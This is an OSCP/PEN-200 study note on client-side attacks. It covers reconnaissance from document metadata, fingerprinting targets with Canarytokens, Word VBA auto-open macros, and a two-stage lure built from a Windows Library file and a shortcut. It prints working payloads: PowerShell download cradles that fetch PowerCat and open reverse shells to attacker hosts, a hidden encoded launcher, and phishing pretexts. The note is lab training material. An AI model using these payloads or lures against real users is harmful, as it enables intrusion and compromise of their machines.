---
title: "PEN-200 Chapter 11 - Client-side Attacks"
aliases:
  - "PEN-200 Ch 11 Client-side Attacks"
  - "OSCP Client-side Attacks"
tags:
  - oscp
  - pen-200
  - client-side-attacks
  - reconnaissance
  - phishing
  - microsoft-office
  - vba
  - webdav
  - windows-library
  - reverse-shell
source: "PEN-200 / Penetration Testing with Kali Linux - Chapter 11"
chapter: 11
status: study-note
---

# PEN-200 Chapter 11 - Client-side Attacks

> [!summary] Chapter purpose
> Client-side attacks are primarily an **Initial Access** technique. Instead of attacking a directly exposed network service, the attacker delivers a file or link to a user and relies on software running on the user's workstation to execute code. Chapter 11 focuses on **target reconnaissance**, **Microsoft Office macros**, and **Windows Library / shortcut files** as ways to obtain an initial foothold inside a non-routable enterprise network.

## Attack-chain position

```text
Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof
  ↑         ↑             ↑
  |         |             └─ Main purpose of this chapter
  |         └─ Target OS/browser/application fingerprinting
  └─ Identify people, documents, software, and delivery opportunities
```

**Primary connection:**

- **Recon:** Identify likely users, public documents, technologies, and suitable delivery paths.
- **Enumeration:** Infer or fingerprint the client OS, browser, Office installation, and other client software.
- **Initial Access:** Deliver a malicious Office document or Windows Library / shortcut chain and obtain code execution or a reverse shell.
- **Privilege Escalation:** Not covered directly here. After the foothold, continue with Windows/Linux privilege-escalation methodology as appropriate.
- **Credentials:** Not covered directly here. Once on the host, enumerate and harvest credentials using techniques from later/other PEN-200 modules.
- **Pivoting:** A client-side foothold is especially useful because the compromised workstation is already **inside** the internal network and can become a pivot point.
- **AD:** If the compromised host is domain-joined, the foothold can become the starting point for Active Directory enumeration and attack paths.
- **Proof:** After achieving the required access, collect the OSCP proof/local flags and document the exact path used.

---

# 11 Client-side Attacks

Client-side attacks target software on a user's workstation rather than a remotely exposed service. The chapter emphasizes that enterprise perimeter compromise through direct technical vulnerabilities is often difficult, while phishing and other user-driven delivery methods remain important attack vectors.

Common delivery ideas discussed in the chapter include:

- Email attachments.
- Links to malicious websites or files.
- USB dropping.
- Watering-hole attacks.

The payload must match the target environment. Examples given include:

- **JScript** executed through **Windows Script Host**.
- **`.lnk` shortcut files** that point to malicious resources.
- **Microsoft Office documents with macros**.

> [!important] OSCP mindset
> Do not choose a client-side payload before learning enough about the target. The chapter repeatedly connects successful exploitation to knowing the target's OS, browser, Office software, and likely user behavior.

The chapter also explicitly stresses **ethical and legal boundaries** in social engineering. A penetration tester may use deception within the rules of engagement, but should not cross boundaries such as blackmail or impersonating law enforcement.

---

# 11.1 Target Reconnaissance

## Objectives

- Gather information needed to prepare a client-side attack.
- Use client fingerprinting to obtain target information.

Unlike classic network reconnaissance, the target workstation is often not directly reachable. Reconnaissance therefore relies more heavily on public information, documents, user research, and controlled interaction with the target.

Potential targets can be identified through:

- The company website and contact pages.
- Public employee information.
- Social media and passive information gathering.

---

## 11.1.1 Information Gathering

### Goal

Enumerate likely client-side software **without directly interacting with the target workstation**. This can reduce forensic traces and avoid triggering monitoring systems.

### Public-document metadata

Public documents can contain metadata such as:

- Author.
- Creation and modification dates.
- Software name and version.
- Operating system indicators.
- Document producer / creator application.

Metadata is useful but may be stale. An older document may not represent the organization's current software, and different offices or branches can have different environments.

### Finding documents

The chapter gives this Google search operator example:

```text
site:example.com filetype:pdf
```

**Meaning:**

- `site:example.com` - restrict results to the target domain.
- `filetype:pdf` - restrict results to PDF files.

**When/why:** Use it as a passive method to locate public documents that may contain useful metadata. Additional keywords can narrow the search to a branch, city, department, or other target-specific context.

The chapter also mentions **Gobuster** as an active/noisier option and specifically notes its `-x` parameter for searching selected file extensions.

- **Tool:** `gobuster`
- **Argument:** `-x`
- **Purpose:** Include one or more file extensions during content discovery.
- **Trade-off:** This directly interacts with the target website and can create log entries.

> [!note]
> The chapter mentions Gobuster and `-x`, but does **not** print a complete Gobuster command in this section.

### Downloading and inspecting the sample brochure

```bash
cd Downloads
```

- `cd` - changes the current directory.
- `Downloads` - moves into the directory containing the downloaded brochure.
- **Why:** Makes the file available by a simple relative filename for the next command.

```bash
exiftool -a -u brochure.pdf
```

**Tool:** `exiftool` - displays file metadata.

**Arguments:**

- `-a` - display duplicated metadata tags as well.
- `-u` - display unknown tags.
- `brochure.pdf` - target file.

**When/why:** Use ExifTool on documents collected during reconnaissance to infer internal usernames, Office products, document age, platform clues, and other environmental details.

The example output reveals, among other things:

- `Creator` / `Author`: **Stanley Yelnats**.
- `Producer`: **Microsoft PowerPoint for Microsoft 365**.
- Recent creation/modification timestamps.

From this, the chapter infers that Microsoft Office is in use and that Windows is likely, making Office- and Windows-based client-side techniques plausible.

### Recon decision point

```text
Public document
   ↓
Metadata fresh enough?
   ├─ No → Lower confidence / gather more evidence
   └─ Yes
       ↓
Office / Windows indicators?
       ├─ Yes → Consider Office macros, .lnk, Windows components
       └─ No  → Choose a different client-side vector
```

---

## 11.1.2 Client Fingerprinting

### Goal

Obtain information about a target workstation in a non-routable network, especially:

- Operating system.
- Browser.
- Public/source IP information.
- Other browser/device attributes.

The chapter assumes an email address may already have been found with **theHarvester** and discusses an **HTA (HTML Application)** as one possible client-side vector if the victim is on Windows and Internet Explorer / Microsoft Edge support is suitable.

> [!note]
> `theHarvester` and HTA are discussed conceptually here; the chapter does not provide a command to run theHarvester or create an HTA in this section.

### Canarytokens workflow

**Tool/service:** Canarytokens.

The chapter creates a **Web bug / URL token**, supplies either an email address or webhook for alerts, and uses a plausible pretext to encourage a target to open the URL.

Example pretext concept:

- Target works in finance.
- Sender claims an invoice contains an error.
- The tracking URL is described as a screenshot highlighting the problem.

When opened, the URL can reveal details about the visitor. The chapter checks:

- Location / organization estimate.
- User-Agent string.
- Browser information collected through JavaScript fingerprinting.

### User-Agent caveat

The User-Agent can indicate OS and browser, but it can be modified and is therefore not fully reliable.

The example suggests:

- Chrome.
- 64-bit Windows 10.

Canarytokens' JavaScript-based browser information is described as more precise/reliable than the User-Agent alone.

### Other fingerprinting methods mentioned

- Canarytokens embedded in Word documents.
- Canarytokens embedded in PDFs.
- Canarytokens embedded in images.
- **Grabify** as an IP logger.
- **fingerprint.js** as a JavaScript fingerprinting library.

### Decision after fingerprinting

The chapter's intended HTA idea required a Windows target with a suitable IE/Edge environment, but the collected data only established Chrome on Windows. Therefore:

- Select a different attack vector, **or**
- Change the pretext/workflow to encourage the required browser if appropriate within the engagement.

> [!tip] OSCP takeaway
> Fingerprinting is not just collection. Use the result to **change the payload or delivery path**. A client-side attack should be selected from evidence, not from preference.

---

# 11.2 Exploiting Microsoft Office

## Objectives

- Understand variations of Microsoft Office client-side attacks.
- Install Microsoft Office in the lab.
- Leverage Microsoft Word macros.

The core exploitation path is:

```text
Deliver Office document
        ↓
User opens document
        ↓
Macro allowed / enabled
        ↓
VBA executes WScript.Shell
        ↓
PowerShell download cradle
        ↓
PowerCat loaded
        ↓
Reverse shell → Initial Access
```

---

## 11.2.1 Preparing the Attack

The chapter highlights three major practical issues.

### 1. Delivery

Office macro attacks are widely known, so:

- Email providers may filter Office attachments.
- Security products may scan attachments.
- Users may have anti-phishing training that warns against enabling macros.

A pretext plus a **download link** may sometimes be more effective than directly attaching the document.

### 2. Mark of the Web (MOTW) and Protected View

Documents delivered from the Internet may receive **Mark of the Web (MOTW)**. Office opens such documents in **Protected View**, which blocks editing, macros, and embedded objects until the user permits the document to leave Protected View.

The older/basic flow shown in the chapter is:

```text
Open Internet-delivered file
        ↓
Protected View
        ↓
Enable Editing
        ↓
Macro warning
        ↓
Enable Content
        ↓
Macro runs
```

### 3. Macros blocked by default for Internet-delivered files

Microsoft changed Office behavior so that, for many versions/channels, Internet-delivered macro files are blocked more strongly. Instead of simply clicking **Enable Content**, the user may need to explicitly **Unblock** the file through its file properties.

> [!important]
> For exam methodology, treat Office macro execution as dependent on the target's exact Office security state. Delivery, MOTW, Protected View, macro policy, and user action all matter.

The chapter notes that Microsoft Publisher historically lacked the same Protected View behavior, but it is less commonly installed.

---

## 11.2.2 Installing Microsoft Office

This subsection is a **lab-environment setup** step rather than an exploitation technique.

### RDP choice

- Windows 11 enables **Network Level Authentication (NLA)** by default.
- The OFFICE machine is not domain-joined.
- The chapter notes that `rdesktop` will not work for this case.
- Use **`xfreerdp`**, which supports NLA for a non-domain-joined target.

> [!note]
> The chapter states that `xfreerdp` should be used but does **not** print a complete command line for this RDP connection.

Lab credentials stated in the chapter:

```text
username: offsec
password: lab
```

Installation path:

```text
C:\tools\Office2019.img
```

Procedure:

1. Connect to the OFFICE VM over RDP.
2. Open `C:\tools\Office2019.img`.
3. Mount/open the image as a virtual CD.
4. Run `Setup.exe`.
5. Finish installation.
6. Start Microsoft Word.
7. Close the product-key popup to start the trial.
8. Accept the license agreement.
9. For optional data, select **No, don't send optional data**.
10. Finish configuration.

---

## 11.2.3 Leveraging Microsoft Word Macros

### Macro basics

Microsoft Office supports macros written in **VBA (Visual Basic for Applications)**. VBA can access ActiveX objects and Windows Script Host functionality, which allows a macro to start local processes.

The chapter notes that older techniques such as **DDE** and some **OLE** methods are less practical today without substantial target modification.

### File format choice

The chapter creates `mymacro` and saves it as a legacy **`.doc`** file.

Important distinction:

- `.doc` - can persist embedded macros.
- `.docm` - macro-enabled modern Word format and can persist macros.
- `.docx` - can run a macro from an attached template, but cannot persist an embedded VBA macro in the same way.

### Default macro skeleton

```vb
Sub MyMacro()
'
' MyMacro Macro
'
'
End Sub
```

**VBA concepts:**

- `Sub MyMacro()` - begins a sub procedure named `MyMacro`.
- `End Sub` - ends the procedure.
- `'` - starts a single-line VBA comment.

A `Sub` is similar to a function but does not return a value for use in an expression.

### Execute PowerShell from VBA

```vb
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

**Explanation:**

- `CreateObject("Wscript.Shell")` - instantiates the Windows Script Host Shell object through ActiveX/COM.
- `.Run` - starts a process/command.
- `"powershell"` - launches PowerShell.

**When/why:** This proves that a VBA macro can reach the underlying OS and execute a command.

### Automatic execution when Word opens the document

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

**Explanation:**

- `AutoOpen()` - predefined macro that can run when a document opens.
- `Document_Open()` - Word document-open event handler.
- Both call `MyMacro`.
- The chapter uses both because their behavior differs slightly depending on how Word/document opening occurs, and together they cover more cases.

After saving and reopening the document, the victim must allow macros for the code to execute under the security behavior shown in the lab.

---

### Upgrade the macro to a reverse shell

The chapter uses **PowerCat** and a PowerShell download cradle.

#### Step 1 - Store the command in a string

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

**Explanation:**

- `Dim Str As String` - declares a string variable called `Str`.
- The final command will be assembled in `Str` and passed to `Wscript.Shell.Run`.

#### Step 2 - PowerShell download cradle + PowerCat

The chapter shows the command before Base64 encoding:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

**Breakdown:**

- `IEX(...)` - PowerShell alias for `Invoke-Expression`; evaluates the downloaded script text.
- `New-Object System.Net.WebClient` - creates a WebClient object.
- `.DownloadString('http://192.168.119.2/powercat.ps1')` - retrieves the PowerCat PowerShell script as text from the attack host.
- `;` - separates the download/execute expression from the next command.
- `powercat` - PowerShell implementation of Netcat-like networking functionality.
- `-c 192.168.119.2` - connect back to the attack host.
- `-p 4444` - use TCP port 4444.
- `-e powershell` - attach/execute PowerShell through the connection.

**When/why:** Use after VBA command execution is proven and a reverse shell is required for a usable foothold.

The chapter says the command is Base64-encoded with `pwsh` on Kali, referring back to an earlier module. It does **not** print the exact `pwsh` encoding command in Chapter 11.

#### Step 3 - VBA 255-character literal-string limitation

VBA literal strings are limited to 255 characters, so the Base64 PowerShell command is split into smaller chunks and concatenated into the `Str` variable.

Python helper shown in the chapter:

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

**Explanation:**

- `str` - stores the long encoded PowerShell launcher.
- `n = 50` - chunk size.
- `range(0, len(str), n)` - advances through the string 50 characters at a time.
- `str[i:i+n]` - slices one chunk.
- `print(...)` - outputs VBA lines in `Str = Str + "..."` format.

PowerShell flags shown in the encoded launcher:

- `-nop` - do not load the user's PowerShell profile.
- `-w hidden` - request a hidden PowerShell window.
- `-e` / `-enc` - encoded command (`EncodedCommand`).

> [!note]
> The chapter explicitly warns that the Base64 string pasted into the helper must contain **no line breaks**.

#### Step 4 - Final macro structure

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
    Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

> [!warning] Source limitation
> The PEN-200 listing itself replaces the middle portion of the Base64 chunks with `...`. The omitted chunks are therefore **not present in the provided chapter**, so they are intentionally not invented here.

### Listener

```bash
nc -nvlp 4444
```

**Tool:** Netcat (`nc`).

**Arguments:**

- `-n` - use numeric IP addresses; avoid DNS lookups.
- `-v` - verbose output.
- `-l` - listen mode.
- `-p 4444` - listen on port 4444.

**When/why:** Start this before triggering the payload so the reverse connection has a listener waiting.

The chapter also instructs the attacker to start a **Python3 web server** in the directory containing `powercat.ps1`, but it does not print the exact Python command in this subsection.

### Result

Opening the malicious Word document leads to:

1. Word executes the auto-open macro after macros are allowed.
2. VBA starts PowerShell.
3. PowerShell retrieves PowerCat.
4. PowerCat connects back to the attacker on port 4444.
5. Netcat receives a Windows PowerShell reverse shell.

This completes the chapter's Office-based **Initial Access** path.

---

# 11.3 Abusing Windows Library Files

## Objectives

- Prepare an attack with Windows Library files.
- Use Windows shortcuts to obtain code execution.

Microsoft Office macro attacks are heavily scrutinized by security tools and user-awareness training. The chapter therefore introduces **Windows Library files (`.Library-ms`)** as an alternate first-stage delivery mechanism.

---

## 11.3.1 Obtaining Code Execution via Windows Library Files

### High-level two-stage design

```text
Stage 1: config.Library-ms
        ↓
Victim double-clicks it
        ↓
Windows Explorer shows attacker-controlled WebDAV content like a local folder
        ↓
Stage 2: automatic_configuration.lnk
        ↓
Victim double-clicks shortcut
        ↓
PowerShell download cradle
        ↓
PowerCat reverse shell
```

A Windows Library file is a virtual container that can connect Explorer to a remote data location. The chapter uses a **WebDAV** share hosted on Kali.

The `.Library-ms` file acts as the first stage because security products may treat it less suspiciously than a direct executable-link delivery. The second-stage `.lnk` shortcut actually launches the PowerShell payload.

---

### Set up a WebDAV server with WsgiDAV

#### Install WsgiDAV

```bash
pip3 install wsgidav
```

- `pip3` - Python 3 package installer.
- `install` - install a package.
- `wsgidav` - WebDAV server package.

**When/why:** Install a lightweight WebDAV server on Kali so Windows Explorer can load remote content referenced by the Library file.

The chapter notes a possible PEP 668 error (`externally-managed-environment`) and says the following option can be added if required:

```text
--break-system-packages
```

**Meaning:** Tell pip to proceed despite the externally-managed Python environment restriction.

> [!warning]
> This is presented by the chapter as a lab workaround. It changes how pip interacts with the system-managed Python environment.

#### Create the WebDAV directory and test file

```bash
mkdir /home/kali/webdav
```

- `mkdir` - create a directory.
- `/home/kali/webdav` - directory that will become the WebDAV root.

```bash
touch /home/kali/webdav/test.txt
```

- `touch` - create an empty file (or update timestamps if it exists).
- **Why:** Provides a simple file to verify that Windows can browse the share.

#### Start WsgiDAV

```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

**Arguments:**

- `--host=0.0.0.0` - listen on all network interfaces.
- `--port=80` - listen on TCP port 80.
- `--auth=anonymous` - disable credential requirements for the share.
- `--root /home/kali/webdav/` - expose this directory as the WebDAV root.

**When/why:** Run the attacker-controlled WebDAV share that the Windows Library file will reference.

The chapter confirms the service locally by browsing:

```text
http://127.0.0.1
```

`127.0.0.1` is the Kali host's loopback interface; this test verifies that the WebDAV server is serving `test.txt`.

> [!warning]
> The WsgiDAV output warns that anonymous write access is enabled. The chapter intentionally uses a writable share because it is convenient for moving files during the lab.

---

### Build `config.Library-ms`

The chapter RDPs to the CLIENT137 machine (`192.168.50.194`) and creates `config.Library-ms` using Visual Studio Code. Notepad would also work because the file is XML.

Lab credentials:

```text
username: offsec
password: lab
```

The chapter says to use `xfreerdp`, but does not print the exact command line.

### Windows Library XML - piece by piece

#### XML declaration and library namespace

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
</libraryDescription>
```

- XML declaration sets version and encoding.
- `libraryDescription` is the main library container.
- The namespace is the Windows Library schema used starting with Windows 7.

#### Name and version

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

- `name` - uses a DLL resource name/index rather than an arbitrary display string.
- The chapter uses `@windows.storage.dll,-34582` and mentions `@shell32.dll,-34575` as another option.
- The Windows Storage DLL choice avoids the literal string `shell32`, which may be undesirable with text-based filtering.
- `version` - numeric library version; `6` is used in the example.

#### Pinning and icon

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

- `isLibraryPinned=true` - pin the library to Explorer's navigation pane, making it appear more normal.
- `iconReference` - choose a standard Windows icon.
- `-1003` - Pictures-style folder icon in the example.
- The chapter mentions `-1002` as a Documents-folder-style option.

#### Folder template

```xml
<templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

- `templateInfo` - defines Explorer folder presentation behavior.
- `folderType` - GUID for a Windows known folder template.
- The chapter uses the **Documents** GUID to make the displayed content appear convincing.

#### Remote WebDAV location

```xml
<searchConnectorDescriptionList>
    <searchConnectorDescription>
        <isDefaultSaveLocation>true</isDefaultSaveLocation>
        <isSupported>false</isSupported>
        <simpleLocation>
            <url>http://192.168.119.2</url>
        </simpleLocation>
    </searchConnectorDescription>
</searchConnectorDescriptionList>
```

**Key tags:**

- `searchConnectorDescriptionList` - list of search connectors used by the library.
- `searchConnectorDescription` - one remote-location connector.
- `isDefaultSaveLocation=true` - use the connector as the default save location behavior.
- `isSupported=false` - compatibility-related field used in the example.
- `simpleLocation` - simpler representation of the remote location.
- `url` - attacker-controlled WebDAV URL. This is the **critical redirection point**.

### Complete Windows Library file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.119.2</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

**Expected result:** Double-clicking `config.Library-ms` opens Windows Explorer and displays the WebDAV share's files as if they were local content.

### Important Library-file mutation behavior

After Windows opens the Library file, Windows may modify it:

- A new `serialized` tag appears.
- The URL changes from:

```text
http://192.168.119.2
```

into a WebDAV UNC-style path such as:

```text
\\192.168.119.2\DavWWWRoot
```

The chapter warns that the serialized/modified file may fail on another machine or after a reboot. Therefore, before delivery, restore the Library file to its **original XML** shown above.

> [!important] Exam reminder
> If a Library file worked during testing and then mysteriously opens an empty location on the victim, check whether Windows rewrote the file during your own test. Restore the original XML before delivery.

---

### Create the `.lnk` second-stage payload

On Windows, create a shortcut and point it to PowerShell with this command:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
```

**Arguments/components:**

- `powershell.exe` - start Windows PowerShell.
- `-c` - execute the following command string and then exit/return according to PowerShell behavior.
- `IEX(...)` - evaluate downloaded PowerShell code.
- `New-Object System.Net.WebClient` - instantiate WebClient.
- `DownloadString('http://192.168.119.3:8000/powercat.ps1')` - load PowerCat from the attacker web server on port 8000.
- `powercat -c 192.168.119.3` - connect back to attacker IP.
- `-p 4444` - callback port.
- `-e powershell` - attach PowerShell to the network connection.

The shortcut name used in the chapter is:

```text
automatic_configuration
```

The chapter also notes a social-engineering trick: if a user inspects the shortcut target, a delimiter and benign command can be added after a long malicious command so the suspicious portion is pushed outside the initially visible area of the properties field.

> [!note]
> The chapter describes that trick conceptually but does not give a complete example command for it.

### Host PowerCat and start the listener

The chapter instructs the attacker to:

- Start a **Python3 web server on port 8000** in the directory containing `powercat.ps1`.
- Keep WsgiDAV serving the WebDAV directory.
- Start Netcat on port 4444.

The exact Python web-server command is not printed in this chapter.

Listener:

```bash
nc -nvlp 4444
```

Same options as earlier:

- `-n` - numeric IPs only.
- `-v` - verbose.
- `-l` - listen.
- `-p 4444` - port 4444.

The chapter prefers serving PowerCat from the separate Python web server rather than from the writable WebDAV share because AV/security products could remove or quarantine the payload on the writable share. Keeping WebDAV writable is useful for later file transfer.

---

### Simulated delivery to HR137

The target is:

```text
192.168.50.195
```

The chapter's pretext pretends to come from a new IT team member who asks the user to open the attached directory and run `automatic_configuration` to apply a new management-platform configuration.

For the lab, SMB is used to simulate getting the Library file onto the target.

#### Prepare the WebDAV directory

The chapter prints:

```bash
cd webdav
cd webdav
rm test.txt
```

> [!warning] Source note
> The listing shows `cd webdav` twice. This appears exactly in the provided chapter. Depending on the current working directory, the second command may be redundant or invalid; it is preserved here rather than silently corrected.

- `rm test.txt` - removes the test file so only the intended attack content remains.

#### Upload the Library file through SMB

```bash
smbclient //192.168.50.195/share -c 'put config.Library-ms'
```

**Tool:** `smbclient` - command-line SMB/CIFS client.

**Arguments:**

- `//192.168.50.195/share` - remote SMB share.
- `-c` - execute the supplied smbclient command non-interactively.
- `'put config.Library-ms'` - upload the local Library file to the remote share.

**When/why:** In the lab this simulates delivery. In a real assessment the chapter expects the Library file would more likely be delivered through the agreed social-engineering channel.

### Verify the final reverse shell

```bash
nc -nvlp 4444
```

After the victim opens the Library file and executes the shortcut, the listener receives a Windows PowerShell shell.

The chapter verifies the current user with:

```powershell
whoami
```

Example result:

```text
hr137\hsmith
```

**Tool/command:** `whoami`

- Displays the current security principal/user running the shell.
- **Why:** Confirms which account the client-side payload compromised and establishes the privilege context for the next phase of enumeration and privilege escalation.

---

# 11.4 Wrapping Up

Chapter 11 demonstrates client-side attacks as a way to establish an initial foothold inside an internal network where target workstations are not directly accessible from the Internet.

The complete ideas covered are:

1. **Reconnaissance of people and software** using public documents and metadata.
2. **Client fingerprinting** to identify OS/browser characteristics before selecting a payload.
3. **Microsoft Office macros** using VBA, Windows Script Host, PowerShell, and PowerCat to receive a reverse shell.
4. **Windows Library files** as a first-stage delivery mechanism that exposes an attacker-controlled WebDAV share in Explorer.
5. **`.lnk` shortcut files** as a second stage that launches PowerShell and creates a reverse shell.

---

# Command and tool reference

| Tool / command | Purpose | Important arguments / notes | Where it fits |
|---|---|---|---|
| `site:example.com filetype:pdf` | Find public PDFs | `site:` restricts domain; `filetype:` restricts type | Recon |
| `gobuster` | Active web content discovery | `-x` includes extensions; noisy | Recon / Enumeration |
| `exiftool -a -u brochure.pdf` | Read metadata | `-a` duplicates; `-u` unknown tags | Recon |
| `theHarvester` | Find public target information such as email addresses | Mentioned; no exact command in chapter | Recon |
| Canarytokens | Browser/device fingerprinting | Web bug / URL token used | Enumeration |
| Grabify | IP logging | Mentioned alternative | Enumeration |
| fingerprint.js | Browser fingerprinting library | Mentioned alternative | Enumeration |
| `xfreerdp` | RDP client with NLA support | Mentioned; no exact command in chapter | Lab setup/testing |
| VBA `CreateObject("Wscript.Shell").Run ...` | Launch OS command from macro | Uses Windows Script Host shell object | Initial Access |
| PowerShell `IEX(...DownloadString(...))` | Download and evaluate PowerShell | WebClient download cradle | Initial Access |
| PowerCat | Reverse-shell utility | `-c`, `-p`, `-e` | Initial Access |
| `nc -nvlp 4444` | Receive reverse shell | numeric, verbose, listen, port | Initial Access |
| `pip3 install wsgidav` | Install WebDAV server | `--break-system-packages` if needed in the lab | Delivery setup |
| `wsgidav --host ... --port ... --auth ... --root ...` | Serve WebDAV share | `0.0.0.0`, `80`, anonymous, root dir | Delivery setup |
| `mkdir` / `touch` / `rm` / `cd` | Manage local attack files/directories | Standard Linux filesystem commands | Setup |
| Windows `.Library-ms` XML | Map Explorer to remote WebDAV | `<url>` is the key remote location | Initial Access delivery |
| Windows `.lnk` | Launch PowerShell command | Second-stage shortcut | Initial Access |
| `smbclient ... -c 'put ...'` | Upload file over SMB | `-c` runs a command; `put` uploads | Lab delivery simulation |
| `whoami` | Identify compromised user | No arguments used | Post-foothold enumeration |

---

# Attack-chain connection in practical OSCP terms

## Recon

Use public company data and documents to answer:

- Who is likely to open the payload?
- What department/job role can support a believable pretext?
- What software created public documents?
- Do document metadata and public information suggest Windows and Microsoft Office?

Commands/tools from this chapter:

```text
site:example.com filetype:pdf
exiftool -a -u brochure.pdf
gobuster ... -x ...      # concept/argument mentioned; complete command not printed
```

## Enumeration

Fingerprint the client before committing to a payload:

```text
Canarytokens → OS + browser + IP/context
User-Agent → useful but spoofable
JavaScript fingerprint → more reliable client details
```

The result determines whether Office, HTA, `.lnk`, or another vector makes sense.

## Initial Access

Two concrete paths in the chapter:

### Path A - Office macro

```text
.doc/.docm → VBA AutoOpen/Document_Open → Wscript.Shell → PowerShell → PowerCat → nc listener
```

### Path B - Library + shortcut

```text
.Library-ms → WebDAV in Explorer → .lnk → PowerShell → PowerCat → nc listener
```

## Privilege Escalation

Not taught in this chapter. Immediately after receiving the shell:

- Identify user/context (`whoami`).
- Enumerate OS and privileges.
- Begin the appropriate Windows privilege-escalation workflow.

## Credentials

Not taught directly here. The client-side foothold is the platform from which you can later search for:

- User secrets.
- Saved credentials.
- Configuration files.
- Tokens/tickets or other credential material, depending on later PEN-200 techniques.

## Pivoting

This chapter is particularly relevant to pivoting because the compromised workstation may sit on a network that was **not directly routable from Kali**. Once the shell is obtained, the system can become a stepping stone for internal enumeration and tunneling/pivoting techniques.

## Active Directory

If the client is joined to a domain, this foothold can expose:

- Domain identity/context.
- Internal DNS and domain controllers.
- SMB/LDAP/Kerberos-accessible services.
- Additional users/computers and AD attack paths.

AD-specific enumeration/exploitation is outside Chapter 11, but **client-side Initial Access can be the entry point that makes AD reachable**.

## Proof

After completing required exploitation and privilege escalation on an OSCP target:

- Collect the required proof/local flag according to the exam rules.
- Record the compromised username, host, IP, payload path, and commands used.
- Keep screenshots and a reproducible sequence for the report.

---

# Mini cheat sheet - Chapter 11

> [!tip] Keep beside you while solving
> These are the highest-value commands/reminders from this chapter. Items whose exact command was not printed in the chapter are intentionally described rather than invented.

1. **Search public PDFs**
   ```text
   site:target.tld filetype:pdf
   ```

2. **Inspect metadata**
   ```bash
   exiftool -a -u file.pdf
   ```

3. **Remember:** fresh metadata > stale metadata; different branches may use different software.

4. **Fingerprint before payload selection:** OS + browser + likely installed apps.

5. **User-Agent can lie; JavaScript fingerprinting is usually stronger evidence.**

6. **Office formats:** `.doc` / `.docm` can persist embedded macros; `.docx` is not the same for embedded macro persistence.

7. **Auto-run VBA entry points**
   ```vb
   Sub AutoOpen()
       MyMacro
   End Sub

   Sub Document_Open()
       MyMacro
   End Sub
   ```

8. **Run an OS command from VBA**
   ```vb
   CreateObject("Wscript.Shell").Run "powershell"
   ```

9. **PowerCat download cradle**
   ```powershell
   IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER/powercat.ps1');powercat -c ATTACKER -p 4444 -e powershell
   ```

10. **Netcat listener**
    ```bash
    nc -nvlp 4444
    ```

11. **VBA string limit:** split long encoded commands into smaller chunks; Chapter 11 uses 50-character chunks.

12. **Install WsgiDAV**
    ```bash
    pip3 install wsgidav
    ```

13. **Create WebDAV root**
    ```bash
    mkdir /home/kali/webdav
    touch /home/kali/webdav/test.txt
    ```

14. **Start WebDAV**
    ```bash
    /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
    ```

15. **Library file key idea:** make `<url>` point to your WebDAV server, then restore the original XML after testing because Windows may rewrite/serialize it.

16. **Shortcut payload example**
    ```powershell
    powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER:8000/powercat.ps1');powercat -c ATTACKER -p 4444 -e powershell"
    ```

17. **Simulated SMB delivery**
    ```bash
    smbclient //TARGET/share -c 'put config.Library-ms'
    ```

18. **Confirm foothold identity**
    ```powershell
    whoami
    ```

19. **Operational reminder:** start the payload web server + WebDAV + Netcat listener **before** triggering the victim action.

20. **Attack-chain reminder:** client-side shell = **Initial Access**, not the finish line. Immediately continue with host enumeration → privilege escalation → credentials → pivot/AD as applicable → proof.

---

# Fast mental model

```text
1. Find user + technology clues
   ↓
2. Confirm OS/browser/application
   ↓
3. Choose delivery that matches target
   ├─ Office present? → macro path
   └─ Windows client? → Library-ms + .lnk path
   ↓
